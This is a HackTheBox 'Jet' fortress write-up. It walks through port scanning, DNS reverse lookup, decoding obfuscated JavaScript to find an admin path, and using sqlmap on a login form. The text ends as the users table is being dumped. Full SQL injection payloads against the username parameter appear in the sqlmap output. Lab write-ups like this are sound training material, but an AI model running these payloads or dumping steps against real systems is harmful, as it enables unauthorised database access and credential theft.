# **JET - HackTheBox Fortress**



\# Fortress (Jet.com)

\# Fortress IP: 10.13.37.10



This is the first fortress lab from Hack The Box called "JET". We are provided with a separate OpenVPN configuration for this fortress. Let's connect and get our VPN IP.





kali@kali:sudo openvpn fortresses\_eu-fort-1.ovpn



So, Let's start with our nmap scan.





kali@kali:nmap -sV -sC 10.13.37.10



Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-30 08:51 +0545

Nmap scan report for 10.13.37.10

Host is up (0.88s latency).

Not shown: 994 closed tcp ports (reset)

PORT     STATE SERVICE  VERSION

22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b:7c (RSA)

|   256 54:e2:7e:5a:1c:aa:9a:ab:65:ca:fa:39:28:bc:0a:43 (ECDSA)

|\_  256 93:bc:37:b7:e0:08:ce:2d:03:99:01:0a:a9:df:da:cd (ED25519)

53/tcp   open  domain   ISC BIND 9.16.48 (Ubuntu Linux)

| dns-nsid: 

|\_  bind.version: 9.16.48-Ubuntu

80/tcp   open  http     nginx 1.10.3 (Ubuntu)

|\_http-title: Welcome to nginx on Debian!

|\_http-server-header: nginx/1.10.3 (Ubuntu)

2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)

|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)

|\_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)

5555/tcp open  freeciv?                                                                                             

| fingerprint-strings:                                                                                              

|   DNSVersionBindReqTCP, GenericLines, GetRequest, adbConnect:                                                     

|     enter your name:                                                                                              

|     \[31mMember manager!                                                                                           

|     edit                                                                                                          

|     change name                                                                                                   

|     gift                                                                                                          

|     exit                                                                                                          

|   NULL:                                                                                                           

|     enter your name:                                                                                              

|   SMBProgNeg:                                                                                                     

|     enter your name:                                                                                              

|     \[31mMember manager!                                                                                           

|     edit                                                                                                          

|     change name                                                                                                   

|     gift                                                                                                          

|     exit                                                                                                          

|     invalid option!                                                                                               

|     \[31mMember manager!                                                                                           

|     edit                                                                                                          

|     change name                                                                                                   

|     gift                                                                                                          

|     exit                                                                                                          

|     invalid option!                                                                                               

|     \[31mMember manager!                                                                                           

|     edit                                                                                                          

|     change name                                                                                                   

|     gift                                                                                                          

|     exit                                                                                                          

|     invalid option!

|     \[31mMember manager!

|     edit

|     change name

|     gift

|     exit

|     invalid option!

|     \[31mMember manager!

|     edit

|     change name

|     gift

|     exit

|     invalid option!

|     \[31mMember manager!

|     edit

|     change name

|     gift

|     exit

|     invalid option!

|     \[31mMember manager!

|     edit

|     change name

|     gift

|     exit

|     invalid option!

|     \[31mMember manager!

|     edit

|     change name

|     gift

|     exit

|     invalid option!

|     \[31mMember manager!

|     edit

|     change name

|     gift

|     exit

|\_    invalid option!

7777/tcp open  cbt?

| fingerprint-strings: 

|   Arucer, DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, Socks5, X11Probe: 

|     --==\[\[ Spiritual Memo ]]==--

|     Create a memo

|     Show memo

|     Delete memo

|     Can't you read mate?

|   NULL: 

|     --==\[\[ Spiritual Memo ]]==--

|     Create a memo

|     Show memo

|\_    Delete memo

2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============

SF-Port5555-TCP:V=7.98%I=7%D=1/30%Time=697C2031%P=x86\_64-pc-linux-gnu%r(NU

SF:LL,11,"enter\\x20your\\x20name:\\n")%r(GenericLines,63,"enter\\x20your\\x20n

SF:ame:\\n\\x1b\\\[31mMember\\x20manager!\\x1b\\\[0m\\n1\\.\\x20add\\n2\\.\\x20edit\\n3\\.

SF:\\x20ban\\n4\\.\\x20change\\x20name\\n5\\.\\x20get\\x20gift\\n6\\.\\x20exit\\n")%r(D

SF:NSVersionBindReqTCP,63,"enter\\x20your\\x20name:\\n\\x1b\\\[31mMember\\x20mana

SF:ger!\\x1b\\\[0m\\n1\\.\\x20add\\n2\\.\\x20edit\\n3\\.\\x20ban\\n4\\.\\x20change\\x20nam

SF:e\\n5\\.\\x20get\\x20gift\\n6\\.\\x20exit\\n")%r(SMBProgNeg,9D1,"enter\\x20your\\

SF:x20name:\\n\\x1b\\\[31mMember\\x20manager!\\x1b\\\[0m\\n1\\.\\x20add\\n2\\.\\x20edit\\

SF:n3\\.\\x20ban\\n4\\.\\x20change\\x20name\\n5\\.\\x20get\\x20gift\\n6\\.\\x20exit\\nin

SF:valid\\x20option!\\n\\x1b\\\[31mMember\\x20manager!\\x1b\\\[0m\\n1\\.\\x20add\\n2\\.\\

SF:x20edit\\n3\\.\\x20ban\\n4\\.\\x20change\\x20name\\n5\\.\\x20get\\x20gift\\n6\\.\\x20

SF:exit\\ninvalid\\x20option!\\n\\x1b\\\[31mMember\\x20manager!\\x1b\\\[0m\\n1\\.\\x20a

SF:dd\\n2\\.\\x20edit\\n3\\.\\x20ban\\n4\\.\\x20change\\x20name\\n5\\.\\x20get\\x20gift\\

SF:n6\\.\\x20exit\\ninvalid\\x20option!\\n\\x1b\\\[31mMember\\x20manager!\\x1b\\\[0m\\n

SF:1\\.\\x20add\\n2\\.\\x20edit\\n3\\.\\x20ban\\n4\\.\\x20change\\x20name\\n5\\.\\x20get\\

SF:x20gift\\n6\\.\\x20exit\\ninvalid\\x20option!\\n\\x1b\\\[31mMember\\x20manager!\\x

SF:1b\\\[0m\\n1\\.\\x20add\\n2\\.\\x20edit\\n3\\.\\x20ban\\n4\\.\\x20change\\x20name\\n5\\.

SF:\\x20get\\x20gift\\n6\\.\\x20exit\\ninvalid\\x20option!\\n\\x1b\\\[31mMember\\x20ma

SF:nager!\\x1b\\\[0m\\n1\\.\\x20add\\n2\\.\\x20edit\\n3\\.\\x20ban\\n4\\.\\x20change\\x20n

SF:ame\\n5\\.\\x20get\\x20gift\\n6\\.\\x20exit\\ninvalid\\x20option!\\n\\x1b\\\[31mMemb

SF:er\\x20manager!\\x1b\\\[0m\\n1\\.\\x20add\\n2\\.\\x20edit\\n3\\.\\x20ban\\n4\\.\\x20cha

SF:nge\\x20name\\n5\\.\\x20get\\x20gift\\n6\\.\\x20exit\\ninvalid\\x20option!\\n\\x1b\\

SF:\[31mMember\\x20manager!\\x1b\\\[0m\\n1\\.\\x20add\\n2\\.\\x20edit\\n3\\.\\x20ban\\n4\\

SF:.\\x20change\\x20name\\n5\\.\\x20get\\x20gift\\n6\\.\\x20exit\\ninvalid\\x20option

SF:!\\n\\x1b\\\[31mMember\\x20manager!\\x1b\\\[0m\\n1\\.\\x20add\\n2\\.\\x20edit\\n3\\.\\x2

SF:0ban\\n4\\.\\x20change\\x20name\\n5\\.\\x20get\\x20gift\\n6\\.\\x20exit\\ninvalid\\x

SF:20option!\\n\\x1b")%r(adbConnect,63,"enter\\x20your\\x20name:\\n\\x1b\\\[31mMem

SF:ber\\x20manager!\\x1b\\\[0m\\n1\\.\\x20add\\n2\\.\\x20edit\\n3\\.\\x20ban\\n4\\.\\x20ch

SF:ange\\x20name\\n5\\.\\x20get\\x20gift\\n6\\.\\x20exit\\n")%r(GetRequest,63,"ente

SF:r\\x20your\\x20name:\\n\\x1b\\\[31mMember\\x20manager!\\x1b\\\[0m\\n1\\.\\x20add\\n2\\

SF:.\\x20edit\\n3\\.\\x20ban\\n4\\.\\x20change\\x20name\\n5\\.\\x20get\\x20gift\\n6\\.\\x

SF:20exit\\n");

==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============

SF-Port7777-TCP:V=7.98%I=7%D=1/30%Time=697C2031%P=x86\_64-pc-linux-gnu%r(NU

SF:LL,5D,"\\n--==\\\[\\\[\\x20Spiritual\\x20Memo\\x20\\]\\]==--\\n\\n\\\[1\\]\\x20Create\\x

SF:20a\\x20memo\\n\\\[2\\]\\x20Show\\x20memo\\n\\\[3\\]\\x20Delete\\x20memo\\n\\\[4\\]\\x20T

SF:ap\\x20out\\n>\\x20")%r(X11Probe,71,"\\n--==\\\[\\\[\\x20Spiritual\\x20Memo\\x20\\]

SF:\\]==--\\n\\n\\\[1\\]\\x20Create\\x20a\\x20memo\\n\\\[2\\]\\x20Show\\x20memo\\n\\\[3\\]\\x2

SF:0Delete\\x20memo\\n\\\[4\\]\\x20Tap\\x20out\\n>\\x20Can't\\x20you\\x20read\\x20mate

SF:\\?")%r(Socks5,71,"\\n--==\\\[\\\[\\x20Spiritual\\x20Memo\\x20\\]\\]==--\\n\\n\\\[1\\]\\

SF:x20Create\\x20a\\x20memo\\n\\\[2\\]\\x20Show\\x20memo\\n\\\[3\\]\\x20Delete\\x20memo\\

SF:n\\\[4\\]\\x20Tap\\x20out\\n>\\x20Can't\\x20you\\x20read\\x20mate\\?")%r(Arucer,71

SF:,"\\n--==\\\[\\\[\\x20Spiritual\\x20Memo\\x20\\]\\]==--\\n\\n\\\[1\\]\\x20Create\\x20a\\x

SF:20memo\\n\\\[2\\]\\x20Show\\x20memo\\n\\\[3\\]\\x20Delete\\x20memo\\n\\\[4\\]\\x20Tap\\x2

SF:0out\\n>\\x20Can't\\x20you\\x20read\\x20mate\\?")%r(GenericLines,71,"\\n--==\\\[

SF:\\\[\\x20Spiritual\\x20Memo\\x20\\]\\]==--\\n\\n\\\[1\\]\\x20Create\\x20a\\x20memo\\n\\\[

SF:2\\]\\x20Show\\x20memo\\n\\\[3\\]\\x20Delete\\x20memo\\n\\\[4\\]\\x20Tap\\x20out\\n>\\x2

SF:0Can't\\x20you\\x20read\\x20mate\\?")%r(GetRequest,71,"\\n--==\\\[\\\[\\x20Spirit

SF:ual\\x20Memo\\x20\\]\\]==--\\n\\n\\\[1\\]\\x20Create\\x20a\\x20memo\\n\\\[2\\]\\x20Show\\

SF:x20memo\\n\\\[3\\]\\x20Delete\\x20memo\\n\\\[4\\]\\x20Tap\\x20out\\n>\\x20Can't\\x20yo

SF:u\\x20read\\x20mate\\?")%r(HTTPOptions,71,"\\n--==\\\[\\\[\\x20Spiritual\\x20Memo

SF:\\x20\\]\\]==--\\n\\n\\\[1\\]\\x20Create\\x20a\\x20memo\\n\\\[2\\]\\x20Show\\x20memo\\n\\\[

SF:3\\]\\x20Delete\\x20memo\\n\\\[4\\]\\x20Tap\\x20out\\n>\\x20Can't\\x20you\\x20read\\x

SF:20mate\\?")%r(RTSPRequest,71,"\\n--==\\\[\\\[\\x20Spiritual\\x20Memo\\x20\\]\\]==-

SF:-\\n\\n\\\[1\\]\\x20Create\\x20a\\x20memo\\n\\\[2\\]\\x20Show\\x20memo\\n\\\[3\\]\\x20Dele

SF:te\\x20memo\\n\\\[4\\]\\x20Tap\\x20out\\n>\\x20Can't\\x20you\\x20read\\x20mate\\?")%

SF:r(RPCCheck,71,"\\n--==\\\[\\\[\\x20Spiritual\\x20Memo\\x20\\]\\]==--\\n\\n\\\[1\\]\\x20

SF:Create\\x20a\\x20memo\\n\\\[2\\]\\x20Show\\x20memo\\n\\\[3\\]\\x20Delete\\x20memo\\n\\\[

SF:4\\]\\x20Tap\\x20out\\n>\\x20Can't\\x20you\\x20read\\x20mate\\?")%r(DNSVersionBi

SF:ndReqTCP,71,"\\n--==\\\[\\\[\\x20Spiritual\\x20Memo\\x20\\]\\]==--\\n\\n\\\[1\\]\\x20Cr

SF:eate\\x20a\\x20memo\\n\\\[2\\]\\x20Show\\x20memo\\n\\\[3\\]\\x20Delete\\x20memo\\n\\\[4\\

SF:]\\x20Tap\\x20out\\n>\\x20Can't\\x20you\\x20read\\x20mate\\?")%r(DNSStatusReque

SF:stTCP,71,"\\n--==\\\[\\\[\\x20Spiritual\\x20Memo\\x20\\]\\]==--\\n\\n\\\[1\\]\\x20Creat

SF:e\\x20a\\x20memo\\n\\\[2\\]\\x20Show\\x20memo\\n\\\[3\\]\\x20Delete\\x20memo\\n\\\[4\\]\\x

SF:20Tap\\x20out\\n>\\x20Can't\\x20you\\x20read\\x20mate\\?");

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel



Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 211.84 seconds





That's a lot of info, but we can narrow it down as such:



22 > ssh

53 > domain

80 > http

2222 > ssh

5555 > freeciv?

7777 > cbt?

9201 > wap-wsp-wtp





Port 9201 was found by the rustscan.



PORT     STATE SERVICE      REASON                                                                                                                          

22/tcp   open  ssh          syn-ack ttl 63                                                                                                                  

53/tcp   open  domain       syn-ack ttl 63                                                                                                                  

80/tcp   open  http         syn-ack ttl 63                                                                                                                  

2222/tcp open  EtherNetIP-1 syn-ack ttl 63                                                                                                                  

5555/tcp open  freeciv      syn-ack ttl 63                                                                                                                  

7777/tcp open  cbt          syn-ack ttl 63                                                                                                                  

9201/tcp open  wap-wsp-wtp  syn-ack ttl 63 



So, first let's start with the port 80 as usual.



In the homepage only, you can get the first flag.



Flag1: JET{s.....k}





Let's see if there are any interesting directories. Let's use gobuster for this.



kali@kali:gobuster dir -u http://10.13.37.10 -w /usr/share/wordlists/dirb/big.txt  

&nbsp;                                                                              

===============================================================

Gobuster v3.8.2

by OJ Reeves (@TheColonial) \& Christian Mehlmauer (@firefart)

===============================================================

\[+] Url:                     http://10.13.37.10

\[+] Method:                  GET

\[+] Threads:                 10

\[+] Wordlist:                /usr/share/wordlists/dirb/big.txt

\[+] Negative Status codes:   404

\[+] User Agent:              gobuster/3.8.2

\[+] Timeout:                 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

.htpasswd            (Status: 403) \[Size: 178]

.htaccess            (Status: 403) \[Size: 178]

Progress: 20469 / 20469 (100.00%)

===============================================================

Finished

===============================================================





Nothing from gobuster. Since, it hints us to dig in and the port 53 is for DNS, let's dig in using dig.



kali@kali:dig @10.13.37.10 -x 10.13.37.10                                                                                                                         



; <<>> DiG 9.20.15-2-Debian <<>> @10.13.37.10 -x 10.13.37.10

; (1 server found)

;; global options: +cmd

;; Got answer:

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 48176

;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; WARNING: recursion requested but not available



;; OPT PSEUDOSECTION:

; EDNS: version: 0, flags:; udp: 1232

; COOKIE: 93fb25d23ffbdabe01000000697c23203999a819d984fba9 (good)

;; QUESTION SECTION:

;10.37.13.10.in-addr.arpa.      IN      PTR



;; ANSWER SECTION:

10.37.13.10.in-addr.arpa. 604800 IN     PTR     www.securewebinc.jet.



;; Query time: 524 msec

;; SERVER: 10.13.37.10#53(10.13.37.10) (UDP)

;; WHEN: Fri Jan 30 09:03:51 +0545 2026

;; MSG SIZE  rcvd: 115





Yay, we found another server 'www.securewebinc.jet", let's add it to out hosts file.



kali@kali:cat /etc/hosts   

&nbsp;                                                                                                                                      

10.13.37.10     www.securewebinc.jet



127.0.0.1       localhost

127.0.1.1       kali.kali       kali



\# The following lines are desirable for IPv6 capable hosts

::1     localhost ip6-localhost ip6-loopback

ff02::1 ip6-allnodes

ff02::2 ip6-allrouterso





Heading into the website, at the bottom of the website we find our second flag.



Flag2:{w.....n!}



On the source page of the website, we find something interesting.



<!-- Custom scripts for this template -->

<script src="js/template.js"></script>

<script src="js/secure.js"></script>





There is a "secure.js" javascript, making it kinda fishy. We check the file and found some charcode.



eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));





We will use a online decoder "https://codepen.io/HerbertAnchovy/pen/XLzdYr" to decode this charcode and for good view "https://beautifier.io/" use this to beautify javascript.



function getStats() {

&nbsp;   $.ajax({

&nbsp;       url: "/dirb\_safe\_dir\_rf9EmcEIx/admin/stats.php",

&nbsp;       success: function(result) {

&nbsp;           $('#attacks').html(result)

&nbsp;       },

&nbsp;       error: funcion(result) {

&nbsp;           onsole.log(result);

&nbsp;       }

&nbsp;   });

}

getStats();

stInterval(function() {

&nbsp;   getStats();

}, 10000);





So, this tells us that we have to head to that specific url

"/dirb\_safe\_dir\_rf9EmcEIx/admin/stats.php"



In that site, we find a number "1769744102", which doesn't lead us to anywhere.

So, since stats.php is from admin endpoint, I tried login.php as a hunch, and we have a login page for "Secureweb Inc.".



And, carefully looking at the source code, we find our third flag.



&nbsp; <!-- /.login-logo -->

&nbsp; <div class="login-box-body">

&nbsp;   <p class="login-box-msg">

&nbsp;       Authorized use only.

&nbsp;       <br>

&nbsp;       <span class="text-danger">

&nbsp;               </span>

&nbsp;   </p>



&nbsp;   <!-- JET{s.....l} -->

&nbsp;   <form action="/dirb\_safe\_dir\_rf9EmcEIx/admin/dologin.php" method="post">





Flag3:JET{s.....l}



Since, it is a login page, let's check if it is 

susceptible to SQL Injection.



While, doing some manual test on login, I notice that the error message it provides gives us hint.



When, the username is admin. Error: Wrong password for user admin

When, the username is anything else: Error: Unknown user





This, hints us that admin is the valid user.



Tried some manual payloads, didn't work. Now let's try with  sqlmap.



For this, first capture the POST login request using burpsuite, save it as a file and use that file as a input for sqlmap. I like to use this methodology as it provides sqlmap with more than enough information to attack, without us specifying the parameters and everything.



POST /dirb\_safe\_dir\_rf9EmcEIx/admin/dologin.php HTTP/1.1

Host: www.securewebinc.jet

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:140.0) Gecko/20100101 Firefox/140.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 31

Origin: http://www.securewebinc.jet

Connection: keep-alive

Referer: http://www.securewebinc.jet/dirb\_safe\_dir\_rf9EmcEIx/admin/login.php

Cookie: PHPSESSID=ui3qro1upnu2gaklk3f3nopd10

Upgrade-Insecure-Requests: 1

Priority: u=0, i



username=admin\&password=letmein





kali@kali:cat 1.txt 

&nbsp;                                                                                                                                             

<?xml version="1.0"?>

<!DOCTYPE items \[

<!ELEMENT items (item\*)>

<!ATTLIST items burpVersion CDATA "">

<!ATTLIST items exportTime CDATA "">

<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>

<!ELEMENT time (#PCDATA)>

<!ELEMENT url (#PCDATA)>

<!ELEMENT host (#PCDATA)>

<!ATTLIST host ip CDATA "">

<!ELEMENT port (#PCDATA)>

<!ELEMENT protocol (#PCDATA)>

<!ELEMENT method (#PCDATA)>

<!ELEMENT path (#PCDATA)>

<!ELEMENT extension (#PCDATA)>

<!ELEMENT request (#PCDATA)>

<!ATTLIST request base64 (true|false) "false">

<!ELEMENT status (#PCDATA)>

<!ELEMENT responselength (#PCDATA)>

<!ELEMENT mimetype (#PCDATA)>

<!ELEMENT response (#PCDATA)>

<!ATTLIST response base64 (true|false) "false">

<!ELEMENT comment (#PCDATA)>

]>

<items burpVersion="2025.12.3" exportTime="Fri Jan 30 09:36:40 NPT 2026">

&nbsp; <item>

&nbsp;   <time>Fri Jan 30 09:36:23 NPT 2026</time>

&nbsp;   <url><!\[CDATA\[http://www.securewebinc.jet/dirb\_safe\_dir\_rf9EmcEIx/admin/dologin.php]]></url>

&nbsp;   <host ip="10.13.37.10">www.securewebinc.jet</host>

&nbsp;   <port>80</port>

&nbsp;   <protocol>http</protocol>

&nbsp;   <method><!\[CDATA\[POST]]></method>

&nbsp;   <path><!\[CDATA\[/dirb\_safe\_dir\_rf9EmcEIx/admin/dologin.php]]></path>

&nbsp;   <extension>php</extension>

&nbsp;   <request base64="true"><!\[CDATA\[UE9TVCAvZGlyYl9zYWZlX2Rpcl9yZjlFbWNFSXgvYWRtaW4vZG9sb2dpbi5waHAgSFRUUC8xLjENCkhvc3Q6IHd3dy5zZWN1cmV3ZWJpbmMuamV0DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjE0MC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzE0MC4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAzMQ0KT3JpZ2luOiBodHRwOi8vd3d3LnNlY3VyZXdlYmluYy5qZXQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNClJlZmVyZXI6IGh0dHA6Ly93d3cuc2VjdXJld2ViaW5jLmpldC9kaXJiX3NhZmVfZGlyX3JmOUVtY0VJeC9hZG1pbi9sb2dpbi5waHANCkNvb2tpZTogUEhQU0VTU0lEPXVpM3FybzF1cG51Mmdha2xrM2Yzbm9wZDEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpQcmlvcml0eTogdT0wLCBpDQoNCnVzZXJuYW1lPWFkbWluJnBhc3N3b3JkPWxldG1laW4=]]></request>

&nbsp;   <status></status>

&nbsp;   <responselength></responselength>

&nbsp;   <mimetype></mimetype>

&nbsp;   <response base64="true"></response>

&nbsp;   <comment></comment>

&nbsp; </item>

</items>





We are now ready for the sqlmap, we will use --dump flag. It will take time but dump all the things we need.

Also, we will specify --batch flag, it will automate the y or n, let it automate :).



kali@kali:sqlmap -r 1.txt --dump --batch   

&nbsp;                                                                                                                      

&nbsp;       \_\_\_

&nbsp;      \_\_H\_\_                                                                                                                                                

&nbsp;\_\_\_ \_\_\_\[']\_\_\_\_\_ \_\_\_ \_\_\_  {1.10#stable}                                                                                                                     

|\_ -| . \["]     | .'| . |                                                                                                                                   

|\_\_\_|\_  \["]\_|\_|\_|\_\_,|  \_|                                                                                                                                   

&nbsp;     |\_|V...       |\_|   https://sqlmap.org                                                                                                                



\[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program



\[\*] starting @ 09:38:07 /2026-01-30/



\[09:38:07] \[INFO] parsing HTTP request from '1.txt'

\[09:38:07] \[INFO] testing connection to the target URL

got a 302 redirect to 'http://www.securewebinc.jet/dirb\_safe\_dir\_rf9EmcEIx/admin/login.php'. Do you want to follow? \[Y/n] Y

redirect is a result of a POST request. Do you want to resend original POST data to a new location? \[Y/n] Y

\[09:38:09] \[INFO] checking if the target is protected by some kind of WAF/IPS

\[09:38:10] \[INFO] testing if the target URL content is stable

\[09:38:12] \[WARNING] POST parameter 'username' does not appear to be dynamic

\[09:38:14] \[INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')

\[09:38:15] \[INFO] testing for SQL injection on POST parameter 'username'

it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? \[Y/n] Y

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? \[Y/n] Y

\[09:38:15] \[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'

\[09:38:23] \[INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="          Wrong password for user admin      ")

\[09:38:23] \[INFO] testing 'Generic inline queries'

\[09:38:24] \[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'

\[09:38:25] \[INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'

\[09:38:28] \[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'

\[09:38:29] \[INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'

\[09:38:31] \[INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID\_SUBSET)'

\[09:38:33] \[INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID\_SUBSET)'

\[09:38:34] \[INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON\_KEYS)'

\[09:38:36] \[INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON\_KEYS)'

\[09:38:37] \[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'

\[09:38:38] \[INFO] POST parameter 'username' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 

\[09:38:38] \[INFO] testing 'MySQL inline queries'

\[09:38:39] \[INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'

\[09:38:39] \[WARNING] time-based comparison requires larger statistical model, please wait............ (done)                                               

\[09:38:56] \[INFO] testing 'MySQL >= 5.0.12 stacked queries'

\[09:38:58] \[INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'

\[09:39:00] \[INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'

\[09:39:01] \[INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'

\[09:39:03] \[INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'

\[09:39:05] \[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'

\[09:39:19] \[INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 

\[09:39:19] \[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'

\[09:39:19] \[INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found

\[09:39:21] \[INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test

\[09:39:26] \[INFO] target URL appears to have 3 columns in query

\[09:39:36] \[WARNING] reflective value(s) found and filtering out

\[09:39:36] \[INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? \[y/N] N

sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:

---

Parameter: username (POST)

&nbsp;   Type: boolean-based blind

&nbsp;   Title: AND boolean-based blind - WHERE or HAVING clause

&nbsp;   Payload: username=admin' AND 6795=6795 AND 'NjyI'='NjyI\&password=letmein



&nbsp;   Type: error-based

&nbsp;   Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)

&nbsp;   Payload: username=admin' AND (SELECT 5495 FROM(SELECT COUNT(\*),CONCAT(0x7176787871,(SELECT (ELT(5495=5495,1))),0x7162787171,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) AND 'tpbt'='tpbt\&password=letmein



&nbsp;   Type: time-based blind

&nbsp;   Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)

&nbsp;   Payload: username=admin' AND (SELECT 2629 FROM (SELECT(SLEEP(5)))ZQjP) AND 'bHkH'='bHkH\&password=letmein



&nbsp;   Type: UNION query

&nbsp;   Title: Generic UNION query (NULL) - 3 columns

&nbsp;   Payload: username=-9579' UNION ALL SELECT NULL,CONCAT(0x7176787871,0x6b616c566841654f666e506d6b495842524f474f50534e4a5669794273664743566d53686549424a,0x7162787171),NULL-- -\&password=letmein

---

\[09:39:36] \[INFO] the back-end DBMS is MySQL

web server operating system: Linux Ubuntu

web application technology: Nginx 1.10.3

back-end DBMS: MySQL >= 5.0

\[09:39:49] \[WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries

\[09:39:49] \[INFO] fetching current database

\[09:39:51] \[INFO] fetching tables for database: 'jetadmin'

\[09:39:54] \[INFO] fetching columns for table 'users' in database 'jetadmin'

\[09:39:59] \[INFO] retrieved: 'id','int(11)'

\[09:40:00] \[INFO] retrieved: 'username','varchar(50)'

\[09:40:01] \[INFO] retrieved: 'password','varchar(191)'

\[09:40:01] \[INFO] fetching entries for table 'users' in database 'jetadmin'                                                                                

